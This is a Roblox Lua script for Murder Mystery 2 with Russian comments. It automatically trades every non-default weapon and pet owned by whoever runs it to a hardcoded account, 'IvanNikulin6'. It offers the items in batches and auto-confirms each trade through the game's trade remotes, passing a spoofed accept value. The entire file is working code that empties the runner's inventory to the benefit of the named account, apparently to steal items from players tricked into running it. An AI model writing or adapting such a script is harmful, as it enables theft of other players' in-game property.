-- 🎁 MM2 AUTO MASS TRADE (ИСПРАВЛЕННЫЙ)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage:WaitForChild("Trade", 30)
local Players = game:GetService("Players")

if not Trade then 
    warn("[ERROR] Trade not found")
    return 
end

-- ✅ ПРОВЕРКА ВСЕХ REMOTE ОБЪЕКТОВ
local SendRequest  = Trade:FindFirstChild("SendRequest")
local StartTrade   = Trade:FindFirstChild("StartTrade")
local UpdateTrade  = Trade:FindFirstChild("UpdateTrade")
local OfferItem    = Trade:FindFirstChild("OfferItem")
local AcceptTrade  = Trade:FindFirstChild("AcceptTrade")
local DeclineTrade = Trade:FindFirstChild("DeclineTrade")

-- Проверяем что все remotes существуют
if not SendRequest then warn("[ERROR] SendRequest не найден!"); return end
if not StartTrade then warn("[ERROR] StartTrade не найден!"); return end
if not UpdateTrade then warn("[ERROR] UpdateTrade не найден!"); return end
if not OfferItem then warn("[ERROR] OfferItem не найден!"); return end
if not AcceptTrade then warn("[ERROR] AcceptTrade не найден!"); return end

print("[OK] Все Trade remotes найдены!")

local TARGET_NAME = "IvanNikulin6"
local MAX_UNIQUE = 4

local profileData = nil
local currentLastOffer = nil
local itemsGiven = {}

print("[INFO] Loading ProfileData...")

local success, result = pcall(function()
    local modules = ReplicatedStorage:FindFirstChild("Modules")
    if not modules then
        warn("[ERROR] Modules folder not found!")
        return nil
    end
    
    local profileDataModule = modules:FindFirstChild("ProfileData")
    if not profileDataModule then
        warn("[ERROR] ProfileData module not found!")
        return nil
    end
    
    return require(profileDataModule)
end)

if not success or not result then
    warn("[ERROR] Failed to load ProfileData: " .. tostring(result))
    return 
end

profileData = result
print("[OK] ProfileData loaded")

-- Получение доступных предметов
local function getAvailableItems()
    local items = {}
    
    if not profileData then
        warn("[ERROR] ProfileData is nil!")
        return items
    end
    
    if profileData.Weapons and profileData.Weapons.Owned then
        for name, amount in pairs(profileData.Weapons.Owned) do
            if name ~= "DefaultKnife" and name ~= "DefaultGun" and type(amount) == "number" and amount > 0 then
                local given = itemsGiven[name] or 0
                local left = amount - given
                if left > 0 then
                    table.insert(items, {name = name, type = "Weapons", left = left})
                end
            end
        end
    end
    
    if profileData.Pets and profileData.Pets.Owned then
        for name, amount in pairs(profileData.Pets.Owned) do
            if type(amount) == "number" and amount > 0 then
                local given = itemsGiven[name] or 0
                local left = amount - given
                if left > 0 then
                    table.insert(items, {name = name, type = "Pets", left = left})
                end
            end
        end
    end
    
    return items
end

-- Отслеживание LastOffer
UpdateTrade.OnClientEvent:Connect(function(data)
    if data and data.LastOffer then 
        currentLastOffer = data.LastOffer 
    end
end)

-- Основная функция трейда
local function runTradeCycle()
    local available = getAvailableItems()
    
    if #available == 0 then
        print("\n[SUCCESS] ALL ITEMS TRADED!")
        return false
    end

    local batch = {}
    local maxItems = math.min(MAX_UNIQUE, #available)
    
    for i = 1, maxItems do
        table.insert(batch, available[i])
    end

    print("\n[INFO] New trade - Items: " .. #batch)
    
    for i, it in ipairs(batch) do
        print("   " .. i .. ". " .. it.name .. " x" .. it.left)
    end

    local target = Players:FindFirstChild(TARGET_NAME)
    if not target then 
        warn("[ERROR] Player not found: " .. TARGET_NAME)
        return true 
    end

    -- Отправка запроса
    if SendRequest then
        local reqOk, err = pcall(function() 
            return SendRequest:InvokeServer(target) 
        end)
        
        if not reqOk then 
            warn("[ERROR] Request failed: " .. tostring(err))
            return true 
        end
    else
        warn("[ERROR] SendRequest is nil!")
        return true
    end

    -- Ждём StartTrade
    local started = false
    local sc
    if StartTrade then
        sc = StartTrade.OnClientEvent:Connect(function(_, pName)
            if pName == TARGET_NAME then 
                started = true 
                if sc then sc:Disconnect() sc = nil end
            end
        end)
    else
        warn("[ERROR] StartTrade is nil!")
        return true
    end
    
    local t0 = tick()
    while not started and tick() - t0 < 10 do 
        task.wait(0.5) 
    end
    
    if not started then 
        warn("[ERROR] Trade did not open")
        if sc then sc:Disconnect() sc = nil end
        return true 
    end

    currentLastOffer = nil
    
    print("[INFO] Trade opened. Offering items...")

    -- Выкладываем предметы
    if OfferItem then
        for _, it in ipairs(batch) do
            for i = 1, it.left do
                local ok, err = pcall(function() 
                    OfferItem:FireServer(it.name, it.type) 
                end)
                
                if ok then
                    itemsGiven[it.name] = (itemsGiven[it.name] or 0) + 1
                    print("   [OK] " .. it.name .. " (" .. i .. "/" .. it.left .. ")")
                else
                    warn("   [ERROR] " .. it.name .. ": " .. tostring(err))
                end
                
                task.wait(0.25)
            end
        end
    else
        warn("[ERROR] OfferItem is nil!")
    end
    
    -- Ждём кулдаун
    print("[INFO] Waiting 6s cooldown...")
    task.wait(6)
    
    -- Ждём LastOffer
    if not currentLastOffer then
        print("[INFO] Waiting for LastOffer...")
        local t1 = tick()
        while not currentLastOffer and tick() - t1 < 5 do
            task.wait(0.5)
        end
    end

    if currentLastOffer and AcceptTrade then
        print("[INFO] Waiting 0.5s before confirm...")
        task.wait(0.5)
        
        print("[INFO] Confirming trade...")
        local confirmOk, err = pcall(function()
            AcceptTrade:FireServer(game.PlaceId * 3, currentLastOffer)
        end)
        
        if not confirmOk then
            warn("[ERROR] Confirm failed: " .. tostring(err))
        end
    else
        if not AcceptTrade then
            warn("[ERROR] AcceptTrade is nil!")
        else
            warn("[WARN] No LastOffer received")
        end
    end

    -- Ждём завершения
    local done = false
    local ac
    if AcceptTrade then
        ac = AcceptTrade.OnClientEvent:Connect(function() 
            done = true 
            if ac then ac:Disconnect() ac = nil end
        end)
    end
    
    local t2 = tick()
    while not done and tick() - t2 < 15 do 
        task.wait(0.5) 
    end
    
    if ac then ac:Disconnect() ac = nil end

    print("[INFO] Trade completed. Waiting 6s...")
    task.wait(6)
    
    return true
end

-- Запуск
print("\n[START] AUTO-TRADE SYSTEM")
print("[TARGET] " .. TARGET_NAME)

while runTradeCycle() do end

print("[DONE] Finished")
